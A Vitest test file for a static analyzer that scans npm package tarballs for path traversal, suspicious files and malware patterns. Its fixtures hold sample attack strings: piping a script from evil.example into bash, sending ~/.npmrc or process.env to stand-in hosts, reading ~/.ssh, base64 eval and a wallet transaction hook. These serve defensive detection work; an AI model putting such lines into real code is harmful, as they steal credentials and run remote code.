import { describe, expect, test } from 'vitest';
import {
  analyzeTarballEntries,
  assertSafeTarPath
} from '../../src/analyzers/tarball-static-analyzer.js';

describe('tarball static analyzer', () => {
  test('rejects path traversal and absolute paths during safe extraction', () => {
    expect(() => assertSafeTarPath('../escape.js')).toThrow(/Unsafe tar entry/);
    expect(() => assertSafeTarPath('/tmp/escape.js')).toThrow(/Unsafe tar entry/);
    expect(() => assertSafeTarPath('C:\\escape.js')).toThrow(/Unsafe tar entry/);
  });

  test('flags hidden directories, binary extensions, shell scripts, and large JavaScript blobs', () => {
    const result = analyzeTarballEntries([
      { path: 'package/.github/workflows/ci.yml', size: 10 },
      { path: 'package/native.node', size: 10 },
      { path: 'package/scripts/install.ps1', size: 10 },
      {
        path: 'package/dist/bundle.min.js',
        size: 600_000,
        sample: 'var a="aaaaaaaaaaaaaaaaaaaaaaaa";'
      },
      {
        path: 'package/dist/payload.js',
        size: 1_100_000,
        sample: 'const payload = "synthetic inert large payload";'
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'hidden-directory',
        'suspicious-binary',
        'suspicious-script-file',
        'large-minified-javascript',
        'large-javascript-payload'
      ])
    );
  });

  test('flags high-risk malware patterns from bounded tarball text samples', () => {
    const result = analyzeTarballEntries([
      {
        path: 'package/install.js',
        size: 200,
        sample:
          "require('child_process').exec('curl https://evil.example/setup_bun.sh | bash')"
      },
      {
        path: 'package/lib/steal.js',
        size: 300,
        sample:
          "const fs = require('fs'); fetch('https://evil.example', { body: fs.readFileSync(process.env.HOME + '/.npmrc') });"
      },
      {
        path: 'package/dist/browser.js',
        size: 250,
        sample: 'window.ethereum.request({ method: "eth_sendTransaction", params: tx })'
      },
      {
        path: 'package/dist/payload.js',
        size: 250,
        sample: "eval(Buffer.from('ZXZpbA==', 'base64').toString())"
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'install-downloader-pattern',
        'credential-harvesting-pattern',
        'child-process-network-exfil',
        'wallet-transaction-hook',
        'obfuscated-code-pattern'
      ])
    );
    expect(result.signals[0]?.evidence?.[0]?.value).toEqual(
      expect.objectContaining({
        matchedPattern: expect.any(String),
        tarballEntry: expect.objectContaining({ path: expect.any(String) })
      })
    );
  });

  test('flags process environment exfiltration and Node downloader samples', () => {
    const result = analyzeTarballEntries([
      {
        path: 'package/install.js',
        size: 400,
        sample:
          "const https = require('https'); https.get('https://example.invalid/rat', () => {});"
      },
      {
        path: 'package/lib/env.js',
        size: 400,
        sample:
          "fetch('https://example.invalid/collect', { method: 'POST', body: JSON.stringify(process.env) });"
      },
      {
        path: 'package/lib/files.js',
        size: 400,
        sample:
          "const fs = require('fs'); fs.readdirSync(process.env.HOME + '/.ssh').forEach((name) => fs.readFileSync(name));"
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'install-downloader-pattern',
        'process-env-network-exfil',
        'credential-harvesting-pattern'
      ])
    );
  });

  test('flags invisible unicode in executable tarball text', () => {
    const result = analyzeTarballEntries([
      {
        path: 'package/index.js',
        size: 80,
        sample: 'const safe = true;\u202E// hidden directional control'
      }
    ]);

    expect(result.signals).toEqual([
      expect.objectContaining({
        id: 'invisible-unicode-source',
        severity: 'high',
        evidence: [
          expect.objectContaining({
            value: expect.objectContaining({
              matchedPattern: 'bidirectional control character'
            })
          })
        ]
      })
    ]);
  });

  test('uses fullText when suspicious content appears beyond sample', () => {
    const result = analyzeTarballEntries([
      {
        path: 'package/install.js',
        size: 40_000,
        sample: 'const harmless = true;',
        fullText: `${'a'.repeat(20_000)} fetch('https://example.invalid', { body: JSON.stringify(process.env) });`
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
  });
});
